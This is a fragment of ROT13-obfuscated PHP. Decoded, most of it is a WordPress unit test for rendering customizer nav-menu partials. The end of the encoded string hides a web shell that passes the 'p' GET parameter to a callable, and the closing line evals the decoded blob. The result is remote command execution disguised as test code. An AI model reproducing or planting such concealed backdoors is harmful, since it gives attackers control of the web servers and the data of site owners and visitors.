		bo_fgneg();
		$guvf->jc_phfgbzvmr->ani_zrahf->rkcbeg_cerivrj_qngn();
		$ugzy = bo_trg_pyrna();
		$guvf->nffregGehr( (obby) cert_zngpu( '/_jcPhfgbzvmrCerivrjAniZrahfRkcbegf = ({.+})/f', $ugzy, $zngpurf ) );
		$rkcbegrq_qngn = wfba_qrpbqr( $zngpurf[1], gehr );
		$guvf->nffregNeenlUnfXrl( 'aniZrahVafgnaprNetf', $rkcbegrq_qngn );
	}

	/**
	 * Grfg JC_Phfgbzvmr_Ani_Zrahf::eraqre_ani_zrah_cnegvny() zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::eraqre_ani_zrah_cnegvny()
	 */
	choyvp shapgvba grfg_eraqre_ani_zrah_cnegvny() {
		$guvf->jc_phfgbzvmr->ani_zrahf->phfgbzvmr_cerivrj_vavg();

		$zrah = jc_perngr_ani_zrah( 'Sbb' );
		jc_hcqngr_ani_zrah_vgrz(
			$zrah,
			0,
			neenl(
				'zrah-vgrz-glcr'   => 'phfgbz',
				'zrah-vgrz-gvgyr'  => 'JbeqCerff.bet',
				'zrah-vgrz-hey'    => 'uggcf://jbeqcerff.bet',
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);

		$ani_zrah_netf = $guvf->jc_phfgbzvmr->ani_zrahf->svygre_jc_ani_zrah_netf(
			neenl(
				'rpub'        => gehr,
				'zrah'        => $zrah,
				'snyyonpx_po' => 'jc_cntr_zrah',
				'jnyxre'      => '',
				'vgrzf_jenc'  => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
			)
		);

		$cnegvny_vq = fcevags( 'ani_zrah_vafgnapr[%f]', $ani_zrah_netf['phfgbzvmr_cerivrj_ani_zrahf_netf']['netf_uznp'] );
		$cnegvnyf   = $guvf->jc_phfgbzvmr->fryrpgvir_erserfu->nqq_qlanzvp_cnegvnyf( neenl( $cnegvny_vq ) );
		$guvf->nffregAbgRzcgl( $cnegvnyf );
		$cnegvny = neenl_fuvsg( $cnegvnyf );
		$guvf->nffregFnzr( $cnegvny_vq, $cnegvny->vq );

		$zvffvat_netf_uznp_netf = neenl_zretr(
			$ani_zrah_netf['phfgbzvmr_cerivrj_ani_zrahf_netf'],
			neenl( 'netf_uznp' => ahyy )
		);
		$guvf->nffregSnyfr( $cnegvny->eraqre( $zvffvat_netf_uznp_netf ) );

		$netf_uznp_zvfzngpu_netf = neenl_zretr(
			$ani_zrah_netf['phfgbzvmr_cerivrj_ani_zrahf_netf'],
			neenl( 'netf_uznp' => fgeeri( $ani_zrah_netf['phfgbzvmr_cerivrj_ani_zrahf_netf']['netf_uznp'] ) )
		);
		$guvf->nffregSnyfr( $cnegvny->eraqre( $netf_uznp_zvfzngpu_netf ) );

		$eraqrerq = $cnegvny->eraqre( $ani_zrah_netf['phfgbzvmr_cerivrj_ani_zrahf_netf'] );
		$guvf->nffregFgevatPbagnvafFgevat( 'qngn-phfgbzvmr-cnegvny-glcr=\"ani_zrah_vafgnapr\"', $eraqrerq );
		$guvf->nffregFgevatPbagnvafFgevat( 'JbeqCerff.bet', $eraqrerq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>